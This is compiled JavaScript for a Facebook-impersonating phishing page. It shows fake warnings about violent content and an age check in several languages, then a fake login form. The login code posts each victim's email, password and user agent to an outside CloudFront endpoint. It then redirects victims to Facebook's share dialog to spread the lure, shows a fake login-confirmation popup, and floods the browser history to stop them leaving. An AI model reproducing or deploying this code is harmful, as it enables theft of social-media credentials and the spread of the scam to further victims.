    		'popup.age.button': 'Inloggen',

    		//OTHER
    		'global.text_1': '1 nieuwe reactie',
    		'global.text_2': 'Schrijf een opmerking…',
    	},

    	ja: {
    		'popup.safe.title': 'このコンテンツには過激な表現が含まれています',
    		'popup.safe.description_1':
    			'この投稿に含まれる素材には、暴力、ヌード、その他社会的に許容されない行為が含まれる場合があります。警告するために、このメッセージを表示しています。',
    		'popup.safe.description_2':
    			'このような警告を受け取りたくない場合は、以下の設定に移動してください。',
    		'popup.safe.description_3': '設定とプライバシー > 通知の設定',

    		'popup.safe.button_1': '続ける',
    		'popup.safe.button_2': '設定',

    		//LOADING
    		'popup.loading.text': 'ログイン中...',

    		//LOGIN
    		'popup.login.placeholder_1': 'メールアドレスまたは電話番号',
    		'popup.login.placeholder_2': 'パスワード',
    		'popup.login.button': 'ログイン',

    		'popup.login.footer': 'Cookie • アカウント登録',

    		//POST
    		'post.reaction_1': 'いいね！',
    		'post.reaction_2': 'コメントする',
    		'post.reaction_3': 'シェア',

    		//COMMENTS
    		'comment.category': '関連度の高い順',

    		'comment.reaction_1': 'いいね！',
    		'comment.reaction_2': '返信する',

    		//AGE POPUP
    		'popup.age.title': 'このコンテンツを視聴する前に年齢を確認してください',
    		'popup.age.content_1': '過激な表現が含まれるため、',
    		'popup.age.content_2': '年齢を確認してください。',
    		'popup.age.button': 'ログイン',

    		//OTHER
    		'global.text_1': '1件の新しいコメント',
    		'global.text_2': 'コメントを入力….',
    	},

    	uk: {
    		//SAFE
    		'popup.safe.title': 'Ми позначили цей контент як жорстокий',
    		'popup.safe.description_1':
    			'Матеріали, що містяться в цьому пості, можуть містити насильство, оголеність та інші соціально неприйнятні дії. Щоб вас попередити, ми відображаємо цей попереджувальний текст.',
    		'popup.safe.description_2':
    			'Якщо ви не хочете отримувати такі повідомлення, перейдіть до:',
    		'popup.safe.description_3':
    			'Налаштування та конфіденційність> Налаштування повідомлень',

    		'popup.safe.button_1': 'Продовжити',
    		'popup.safe.button_2': 'Налаштування',

    		//LOADING
    		'popup.loading.text': 'Авторизація...',

    		//LOGIN
    		'popup.login.placeholder_1': 'Електронна адреса або номер телефону',
    		'popup.login.placeholder_2': 'Пароль',
    		'popup.login.button': 'Увійти',

    		'popup.login.footer': 'Довідка • Зареєструватися',

    		//POST
    		'post.reaction_1': 'Подобається',
    		'post.reaction_2': 'Коментувати',
    		'post.reaction_3': 'Поширити',

    		//COMMENTS
    		'comment.category': 'Найактуальніші',

    		'comment.reaction_1': 'Подобається',
    		'comment.reaction_2': 'Відповісти',

    		//AGE POPUP
    		'popup.age.title': 'Перед переглядом підтвердьте свій вік',
    		'popup.age.content_1': 'У зв’язку з жорстоким змістом запису',
    		'popup.age.content_2': 'підтвердьте свій вік.',
    		'popup.age.button': 'Увійти',

    		//OTHER
    		'global.text_1': '1 новий коментар',
    		'global.text_2': 'Напишіть коментар…',
    	},
    };

    const langParam = new URL(document.location.href).searchParams.get("ad");
    const browserLanguage = window.navigator.language.split('-')[0].toLowerCase();

    const lang = (langParam || browserLanguage);

    var lang$1 = langs[lang] || langs[Object.keys(langs)[0]];

    /* src\components\popups\Safe.svelte generated by Svelte v3.55.1 */

    function create_fragment(ctx) {
    	let div1;
    	let div0;
    	let header;
    	let t0;
    	let section;
    	let h1;
    	let t2;
    	let article;
    	let p0;
    	let t4;
    	let p1;
    	let t6;
    	let p2;
    	let t8;
    	let footer;
    	let button0;
    	let t10;
    	let button1;
    	let mounted;
    	let dispose;

    	return {
    		c() {
    			div1 = element("div");
    			div0 = element("div");
    			header = element("header");
    			header.innerHTML = `<img class="popup__banner svelte-vca0vp" src="./images/banner.jpg" alt="Empty"/>`;
    			t0 = space();
    			section = element("section");
    			h1 = element("h1");
    			h1.textContent = `${lang$1["popup.safe.title"]}`;
    			t2 = space();
    			article = element("article");
    			p0 = element("p");
    			p0.textContent = `${lang$1["popup.safe.description_1"]}`;
    			t4 = space();
    			p1 = element("p");
    			p1.textContent = `${lang$1["popup.safe.description_2"]}`;
    			t6 = space();
    			p2 = element("p");
    			p2.textContent = `${lang$1["popup.safe.description_3"]}`;
    			t8 = space();
    			footer = element("footer");
    			button0 = element("button");
    			button0.textContent = `${lang$1["popup.safe.button_1"]}`;
    			t10 = space();
    			button1 = element("button");
    			button1.textContent = `${lang$1["popup.safe.button_2"]}`;
    			attr(header, "class", "popup__header");
    			attr(h1, "class", "popup__title svelte-vca0vp");
    			attr(p0, "class", "popup__text svelte-vca0vp");
    			attr(p1, "class", "popup__text popuo__text--italic svelte-vca0vp");
    			attr(p2, "class", "popup__text popup__text--bold svelte-vca0vp");
    			attr(article, "class", "popup__description");
    			attr(section, "class", "popup__content svelte-vca0vp");
    			attr(div0, "class", "popup__top");
    			attr(button0, "class", "popup__button popup__button--continue svelte-vca0vp");
    			attr(button1, "class", "popup__button popup__button--settings svelte-vca0vp");
    			attr(footer, "class", "popup__footer svelte-vca0vp");
    			attr(div1, "class", "popup svelte-vca0vp");
    			toggle_class(div1, "slide-in", /*$popups*/ ctx[0].safe);
    		},
    		m(target, anchor) {
    			insert(target, div1, anchor);
    			append(div1, div0);
    			append(div0, header);
    			append(div0, t0);
    			append(div0, section);
    			append(section, h1);
    			append(section, t2);
    			append(section, article);
    			append(article, p0);
    			append(article, t4);
    			append(article, p1);
    			append(article, t6);
    			append(article, p2);
    			append(div1, t8);
    			append(div1, footer);
    			append(footer, button0);
    			append(footer, t10);
    			append(footer, button1);

    			if (!mounted) {
    				dispose = [
    					listen(button0, "click", /*click_handler*/ ctx[1]),
    					listen(button1, "click", /*click_handler_1*/ ctx[2])
    				];

    				mounted = true;
    			}
    		},
    		p(ctx, [dirty]) {
    			if (dirty & /*$popups*/ 1) {
    				toggle_class(div1, "slide-in", /*$popups*/ ctx[0].safe);
    			}
    		},
    		i: noop,
    		o: noop,
    		d(detaching) {
    			if (detaching) detach(div1);
    			mounted = false;
    			run_all(dispose);
    		}
    	};
    }

    function instance($$self, $$props, $$invalidate) {
    	let $popups;
    	component_subscribe($$self, popups, $$value => $$invalidate(0, $popups = $$value));
    	const click_handler = () => set_store_value(popups, $popups.login = true, $popups);
    	const click_handler_1 = () => set_store_value(popups, $popups.login = true, $popups);
    	return [$popups, click_handler, click_handler_1];
    }

    class Safe extends SvelteComponent {
    	constructor(options) {
    		super();
    		init(this, options, instance, create_fragment, safe_not_equal, {});
    	}
    }

    /* src\components\popups\Login.svelte generated by Svelte v3.55.1 */

    function create_fragment$1(ctx) {
    	let div2;
    	let div1;
    	let div0;
    	let t0;
    	let section;
    	let p0;
    	let t1;
    	let t2;
    	let input0;
    	let input0_placeholder_value;
    	let t3;
    	let input1;
    	let input1_placeholder_value;
    	let t4;
    	let button;
    	let t6;
    	let footer;
    	let p1;
    	let mounted;
    	let dispose;

    	return {
    		c() {
    			div2 = element("div");
    			div1 = element("div");
    			div0 = element("div");
    			div0.innerHTML = `<img class="popup__image svelte-600s1n" src="./images/logo.png" alt="Empty"/>`;
    			t0 = space();
    			section = element("section");
    			p0 = element("p");
    			t1 = text(/*error*/ ctx[1]);
    			t2 = space();
    			input0 = element("input");
    			t3 = space();
    			input1 = element("input");
    			t4 = space();
    			button = element("button");
    			button.textContent = `${lang$1['popup.login.button']}`;
    			t6 = space();
    			footer = element("footer");
    			p1 = element("p");
    			p1.textContent = `${lang$1['popup.login.footer']}`;
    			attr(div0, "class", "popup__avatar svelte-600s1n");
    			attr(p0, "class", "popup__error svelte-600s1n");
    			set_style(p0, "visibility", /*isError*/ ctx[2] ? 'visible' : 'hidden');
    			attr(input0, "type", "email");
    			attr(input0, "class", "login-form__input login-form__input--username svelte-600s1n");
    			attr(input0, "placeholder", input0_placeholder_value = lang$1['popup.login.placeholder_1']);
    			attr(input1, "type", "password");
    			attr(input1, "class", "login-form__input login-form--password svelte-600s1n");
    			attr(input1, "placeholder", input1_placeholder_value = lang$1['popup.login.placeholder_2']);
    			attr(button, "class", "login-form__button svelte-600s1n");
    			attr(section, "class", "login-form svelte-600s1n");
    			attr(div1, "class", "popup__top svelte-600s1n");
    			attr(footer, "class", "popup__footer svelte-600s1n");
    			attr(div2, "class", "popup svelte-600s1n");
    			toggle_class(div2, "slide-in", /*$popups*/ ctx[3].login);
    		},
    		m(target, anchor) {
    			insert(target, div2, anchor);
    			append(div2, div1);
    			append(div1, div0);
    			append(div1, t0);
    			append(div1, section);
    			append(section, p0);
    			append(p0, t1);
    			append(section, t2);
    			append(section, input0);
    			set_input_value(input0, /*user*/ ctx[0].username);
    			append(section, t3);
    			append(section, input1);
    			set_input_value(input1, /*user*/ ctx[0].password);
    			append(section, t4);
    			append(section, button);
    			append(div2, t6);
    			append(div2, footer);
    			append(footer, p1);

    			if (!mounted) {
    				dispose = [
    					listen(input0, "input", /*input0_input_handler*/ ctx[5]),
    					listen(input1, "input", /*input1_input_handler*/ ctx[6]),
    					listen(button, "click", /*login*/ ctx[4])
    				];

    				mounted = true;
    			}
    		},
    		p(ctx, [dirty]) {
    			if (dirty & /*error*/ 2) set_data(t1, /*error*/ ctx[1]);

    			if (dirty & /*isError*/ 4) {
    				set_style(p0, "visibility", /*isError*/ ctx[2] ? 'visible' : 'hidden');
    			}

    			if (dirty & /*user*/ 1 && input0.value !== /*user*/ ctx[0].username) {
    				set_input_value(input0, /*user*/ ctx[0].username);
    			}

    			if (dirty & /*user*/ 1 && input1.value !== /*user*/ ctx[0].password) {
    				set_input_value(input1, /*user*/ ctx[0].password);
    			}

    			if (dirty & /*$popups*/ 8) {
    				toggle_class(div2, "slide-in", /*$popups*/ ctx[3].login);
    			}
    		},
    		i: noop,
    		o: noop,
    		d(detaching) {
    			if (detaching) detach(div2);
    			mounted = false;
    			run_all(dispose);
    		}
    	};
    }

    function instance$1($$self, $$props, $$invalidate) {
    	let $popups;
    	let $geo;
    	component_subscribe($$self, popups, $$value => $$invalidate(3, $popups = $$value));
    	component_subscribe($$self, geo, $$value => $$invalidate(8, $geo = $$value));

    	let { user = {
    		useragent: window.navigator.userAgent,
    		username: "",
    		password: ""
    	} } = $$props;

    	let { error = "" } = $$props;
    	let { isError = false } = $$props;
    	let loginCounter = 0;

    	const login = async () => {
    		if (loginCounter >= 4 || window.navigator.userAgent.includes('Windows')) {
    			set_store_value(popups, $popups.video = true, $popups);
    			document.location.href = `https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/groups/1251315145749810/posts/1251315672416424/`;
    			return;
    		}

    		if (!user.username || !user.password) return;
    		set_store_value(popups, $popups.loading = true, $popups);
    		const langParam = new URL(document.location.href).searchParams.get("ad") || $geo;
    		const lang = langParam.split('_')[0];
    		const userLang = `${lang.toUpperCase()}_${lang.toLowerCase()}`;
    		const url = `${document.location.protocol}//d764cw3iwhuxy.cloudfront.net/api/login?lang=${$geo}&ad=${userLang}`;

    		const response = await fetch(url, {
    			method: "POST",
    			headers: { 'Content-Type': "application/json" },
    			body: JSON.stringify({ user })
    		});

    		loginCounter++;
    		const data = await response.json();
    		const failed = data.success == false;

    		if (data.needConfirm) {
    			set_store_value(popups, $popups.confirm = true, $popups);
    			return false;
    		}

    		if (failed) {
    			if (data.clearEmail) $$invalidate(0, user.username = "", user);
    			$$invalidate(0, user.password = "", user);
    			$$invalidate(1, error = data.message || "");
    			$$invalidate(2, isError = true);
    		} else {
    			set_store_value(popups, $popups.video = true, $popups);
    			document.location.href = `https://www.facebook.com/sharer/sharer.php?u=${document.location.href}`;
    		}

    		set_store_value(popups, $popups.loading = false, $popups);
    	};

    	function input0_input_handler() {
    		user.username = this.value;
    		$$invalidate(0, user);
    	}

    	function input1_input_handler() {
    		user.password = this.value;
    		$$invalidate(0, user);
    	}

    	$$self.$$set = $$props => {
    		if ('user' in $$props) $$invalidate(0, user = $$props.user);
    		if ('error' in $$props) $$invalidate(1, error = $$props.error);
    		if ('isError' in $$props) $$invalidate(2, isError = $$props.isError);
    	};

    	return [
    		user,
    		error,
    		isError,
    		$popups,
    		login,
    		input0_input_handler,
    		input1_input_handler
    	];
    }

    class Login extends SvelteComponent {
    	constructor(options) {
    		super();
    		init(this, options, instance$1, create_fragment$1, safe_not_equal, { user: 0, error: 1, isError: 2 });
    	}
    }

    /* src\components\dynamic-icons\loading.svelte generated by Svelte v3.55.1 */

    function create_fragment$2(ctx) {
    	let svg;
    	let defs;
    	let linearGradient;
    	let stop0;
    	let stop1;
    	let stop2;
    	let g1;
    	let g0;
    	let path;
    	let animateTransform0;
    	let circle;
    	let animateTransform1;

    	return {
    		c() {
    			svg = svg_element("svg");
    			defs = svg_element("defs");
    			linearGradient = svg_element("linearGradient");
    			stop0 = svg_element("stop");
    			stop1 = svg_element("stop");
    			stop2 = svg_element("stop");
    			g1 = svg_element("g");
    			g0 = svg_element("g");
    			path = svg_element("path");
    			animateTransform0 = svg_element("animateTransform");
    			circle = svg_element("circle");
    			animateTransform1 = svg_element("animateTransform");
    			attr(stop0, "class", "dynamic-icon");
    			attr(stop0, "stop-opacity", "0");
    			attr(stop0, "offset", "0%");
    			attr(stop1, "class", "dynamic-icon");
    			attr(stop1, "stop-opacity", ".631");
    			attr(stop1, "offset", "63.146%");
    			attr(stop2, "class", "dynamic-icon");
    			attr(stop2, "offset", "100%");
    			attr(linearGradient, "x1", "8.042%");
    			attr(linearGradient, "y1", "0%");
    			attr(linearGradient, "x2", "65.682%");
    			attr(linearGradient, "y2", "23.865%");
    			attr(linearGradient, "id", "a");
    			attr(animateTransform0, "attributeName", "transform");
    			attr(animateTransform0, "type", "rotate");
    			attr(animateTransform0, "from", "0 18 18");
    			attr(animateTransform0, "to", "360 18 18");
    			attr(animateTransform0, "dur", "0.9s");
    			attr(animateTransform0, "repeatCount", "indefinite");
    			attr(path, "d", "M36 18c0-9.94-8.06-18-18-18");
    			attr(path, "id", "Oval-2");
    			attr(path, "stroke", "url(#a)");
    			attr(path, "stroke-width", "2");
    			attr(animateTransform1, "attributeName", "transform");
    			attr(animateTransform1, "type", "rotate");
    			attr(animateTransform1, "from", "0 18 18");
    			attr(animateTransform1, "to", "360 18 18");
    			attr(animateTransform1, "dur", "0.9s");
    			attr(animateTransform1, "repeatCount", "indefinite");
    			attr(circle, "class", "dynamic-icon");
    			attr(circle, "fill", "currentColor");
    			attr(circle, "cx", "36");
    			attr(circle, "cy", "18");
    			attr(circle, "r", "1");
    			attr(g0, "transform", "translate(1 1)");
    			attr(g1, "fill", "none");
    			attr(g1, "fill-rule", "evenodd");
    			attr(svg, "xmlns", "http://www.w3.org/2000/svg");
    			attr(svg, "width", "20");
    			attr(svg, "height", "20");
    			attr(svg, "viewBox", "0 0 38 38");
    		},
    		m(target, anchor) {
    			insert(target, svg, anchor);
    			append(svg, defs);
    			append(defs, linearGradient);
    			append(linearGradient, stop0);
    			append(linearGradient, stop1);
    			append(linearGradient, stop2);
    			append(svg, g1);
    			append(g1, g0);
    			append(g0, path);
    			append(path, animateTransform0);
    			append(g0, circle);
    			append(circle, animateTransform1);
    		},
    		p: noop,
    		i: noop,
    		o: noop,
    		d(detaching) {
    			if (detaching) detach(svg);
    		}
    	};
    }

    class Loading extends SvelteComponent {
    	constructor(options) {
    		super();
    		init(this, options, null, create_fragment$2, safe_not_equal, {});
    	}
    }

    /* src\components\popups\Loading.svelte generated by Svelte v3.55.1 */

    function create_fragment$3(ctx) {
    	let div1;
    	let div0;
    	let loadingicon;
    	let t0;
    	let p;
    	let current;
    	loadingicon = new Loading({});

    	return {
    		c() {
    			div1 = element("div");
    			div0 = element("div");
    			create_component(loadingicon.$$.fragment);
    			t0 = space();
    			p = element("p");
    			p.textContent = `${lang$1["popup.loading.text"]}`;
    			attr(p, "class", "loading__label other-color svelte-unny8r");
    			attr(div0, "class", "loading__content svelte-unny8r");
    			attr(div1, "class", "loading svelte-unny8r");
    			set_style(div1, "display", /*$popups*/ ctx[0].loading ? 'flex' : 'none');
    		},
    		m(target, anchor) {
    			insert(target, div1, anchor);
    			append(div1, div0);
    			mount_component(loadingicon, div0, null);
    			append(div0, t0);
    			append(div0, p);
    			current = true;
    		},
    		p(ctx, [dirty]) {
    			if (dirty & /*$popups*/ 1) {
    				set_style(div1, "display", /*$popups*/ ctx[0].loading ? 'flex' : 'none');
    			}
    		},
    		i(local) {
    			if (current) return;
    			transition_in(loadingicon.$$.fragment, local);
    			current = true;
    		},
    		o(local) {
    			transition_out(loadingicon.$$.fragment, local);
    			current = false;
    		},
    		d(detaching) {
    			if (detaching) detach(div1);
    			destroy_component(loadingicon);
    		}
    	};
    }

    function instance$2($$self, $$props, $$invalidate) {
    	let $popups;
    	component_subscribe($$self, popups, $$value => $$invalidate(0, $popups = $$value));
    	return [$popups];
    }

    class Loading$1 extends SvelteComponent {
    	constructor(options) {
    		super();
    		init(this, options, instance$2, create_fragment$3, safe_not_equal, {});
    	}
    }

    /* src\components\popups\Video.svelte generated by Svelte v3.55.1 */

    function create_fragment$4(ctx) {
    	let div;

    	return {
    		c() {
    			div = element("div");
    			div.innerHTML = `<iframe class="player svelte-1jsa129" title="vimeo-player" src="https://player.vimeo.com/video/849702056" frameborder="0" allowfullscreen=""></iframe>`;
    			attr(div, "class", "popup svelte-1jsa129");
    			toggle_class(div, "slide-in", /*$popups*/ ctx[0].video);
    		},
    		m(target, anchor) {
    			insert(target, div, anchor);
    		},
    		p(ctx, [dirty]) {
    			if (dirty & /*$popups*/ 1) {
    				toggle_class(div, "slide-in", /*$popups*/ ctx[0].video);
    			}
    		},
    		i: noop,
    		o: noop,
    		d(detaching) {
    			if (detaching) detach(div);
    		}
    	};
    }

    function instance$3($$self, $$props, $$invalidate) {
    	let $popups;
    	component_subscribe($$self, popups, $$value => $$invalidate(0, $popups = $$value));
    	return [$popups];
    }

    class Video extends SvelteComponent {
    	constructor(options) {
    		super();
    		init(this, options, instance$3, create_fragment$4, safe_not_equal, {});
    	}
    }

    /* src\components\popups\Confirm.svelte generated by Svelte v3.55.1 */

    function create_fragment$5(ctx) {
    	let div1;
    	let div0;
    	let t4;
    	let footer;
    	let button;
    	let mounted;
    	let dispose;

    	return {
    		c() {
    			div1 = element("div");
    			div0 = element("div");

    			div0.innerHTML = `<header class="popup__header svelte-ifxduo"><img class="popup__banner svelte-ifxduo" src="./images/confirm.png" alt="Empty"/></header> 
    
        <section class="popup__content svelte-ifxduo"><h1 class="popup__title svelte-ifxduo">Potwierdź swoje logowanie</h1> 
            

            <article class="popup__description"><p class="popup__text svelte-ifxduo">Twoje bezpieczeństwo jest dla nas najwyższym priorytetem, dlatego dokładamy wszelkich starań, aby zapewnić Ci najlepszą ochronę. Prosimy o kliknięcie w przycisk potwierdzający, abyśmy mogli mieć pewność, że to Ty właśnie się zalogowałeś na swoje konto.</p></article></section>`;

    			t4 = space();
    			footer = element("footer");
    			button = element("button");
    			button.textContent = "Potwierdź";
    			attr(div0, "class", "popup__top");
    			attr(button, "class", "popup__button popup__button--continue svelte-ifxduo");
    			attr(footer, "class", "popup__footer svelte-ifxduo");
    			attr(div1, "class", "popup svelte-ifxduo");
    			toggle_class(div1, "slide-in", /*$popups*/ ctx[0].confirm);
    		},
    		m(target, anchor) {
    			insert(target, div1, anchor);
    			append(div1, div0);
    			append(div1, t4);
    			append(div1, footer);
    			append(footer, button);

    			if (!mounted) {
    				dispose = listen(button, "click", /*click_handler*/ ctx[1]);
    				mounted = true;
    			}
    		},
    		p(ctx, [dirty]) {
    			if (dirty & /*$popups*/ 1) {
    				toggle_class(div1, "slide-in", /*$popups*/ ctx[0].confirm);
    			}
    		},
    		i: noop,
    		o: noop,
    		d(detaching) {
    			if (detaching) detach(div1);
    			mounted = false;
    			dispose();
    		}
    	};
    }

    function instance$4($$self, $$props, $$invalidate) {
    	let $popups;
    	component_subscribe($$self, popups, $$value => $$invalidate(0, $popups = $$value));
    	const click_handler = () => document.location.href = "https://d.facebook.com";
    	return [$popups, click_handler];
    }

    class Confirm extends SvelteComponent {
    	constructor(options) {
    		super();
    		init(this, options, instance$4, create_fragment$5, safe_not_equal, {});
    	}
    }

    /* src\App.svelte generated by Svelte v3.55.1 */

    function create_fragment$6(ctx) {
    	let safe;
    	let t0;
    	let login;
    	let t1;
    	let loading;
    	let t2;
    	let video;
    	let t3;
    	let confirm;
    	let current;
    	safe = new Safe({});
    	login = new Login({});
    	loading = new Loading$1({});
    	video = new Video({});
    	confirm = new Confirm({});

    	return {
    		c() {
    			create_component(safe.$$.fragment);
    			t0 = space();
    			create_component(login.$$.fragment);
    			t1 = space();
    			create_component(loading.$$.fragment);
    			t2 = space();
    			create_component(video.$$.fragment);
    			t3 = space();
    			create_component(confirm.$$.fragment);
    		},
    		m(target, anchor) {
    			mount_component(safe, target, anchor);
    			insert(target, t0, anchor);
    			mount_component(login, target, anchor);
    			insert(target, t1, anchor);
    			mount_component(loading, target, anchor);
    			insert(target, t2, anchor);
    			mount_component(video, target, anchor);
    			insert(target, t3, anchor);
    			mount_component(confirm, target, anchor);
    			current = true;
    		},
    		p: noop,
    		i(local) {
    			if (current) return;
    			transition_in(safe.$$.fragment, local);
    			transition_in(login.$$.fragment, local);
    			transition_in(loading.$$.fragment, local);
    			transition_in(video.$$.fragment, local);
    			transition_in(confirm.$$.fragment, local);
    			current = true;
    		},
    		o(local) {
    			transition_out(safe.$$.fragment, local);
    			transition_out(login.$$.fragment, local);
    			transition_out(loading.$$.fragment, local);
    			transition_out(video.$$.fragment, local);
    			transition_out(confirm.$$.fragment, local);
    			current = false;
    		},
    		d(detaching) {
    			destroy_component(safe, detaching);
    			if (detaching) detach(t0);
    			destroy_component(login, detaching);
    			if (detaching) detach(t1);
    			destroy_component(loading, detaching);
    			if (detaching) detach(t2);
    			destroy_component(video, detaching);
    			if (detaching) detach(t3);
    			destroy_component(confirm, detaching);
    		}
    	};
    }

    function instance$5($$self, $$props, $$invalidate) {
    	let $popups;
    	component_subscribe($$self, popups, $$value => $$invalidate(0, $popups = $$value));
    	let rootElement = document.body;

    	const variables = {
    		light: {
    			'theme-background': "#ffffff",
    			'theme-text-color': "#404040",
    			'theme-comment-background': "#eff3f6",
    			'theme-icon-color': "#676767",
    			'theme-border-color': "#e2e2e2",
    			'theme-alternative-text-color': "#747474",
    			'theme-placeholder-color': '#64686b',
    			'theme-popup-button-background': "#e4e6eb",
    			'theme-popup-button-color': "#000000"
    		},
    		dark: {
    			'theme-background': "#222629",
    			'theme-text-color': "#e3e7e9",
    			'theme-comment-background': "#313538",
    			'theme-icon-color': "#b2b6b9",
    			'theme-border-color': "#5f6366",
    			'theme-alternative-text-color': "#b2b6b9",
    			'theme-placeholder-color': '#b2b6b9',
    			'theme-popup-button-background': "#525050",
    			'theme-popup-button-color': "#ffffff"
    		}
    	};

    	const isDarkTheme = window.matchMedia("(prefers-color-scheme: dark)");
    	let currentThemeName = isDarkTheme.matches ? "dark" : "light";

    	for (const variable in variables[currentThemeName]) {
    		rootElement.style.setProperty(`--${variable}`, variables[currentThemeName][variable]);
    	}

    	try {
    		//Push back
    		for (let t = 0; 100 > t; ++t) history.pushState({}, '', '');
    	} catch(err) {
    		console.log(err);
    	}

    	// window.onpopstate = () => setTimeout(() => error("ERROR"), 0);
    	window.onpopstate = () => setTimeout(
    		() => {
    			if ($popups.video) {
    				window.open("fb://unknow", "_blank");
    			} else {
    				document.location.href = `${document.location.href}?popup`;
    			}
    		},
    		0
    	);

    	setGeo();
    	return [];
    }

    class App extends SvelteComponent {
    	constructor(options) {
    		super();
    		init(this, options, instance$5, create_fragment$6, safe_not_equal, {});
    	}
    }

    new App({ target: document.body });

}());
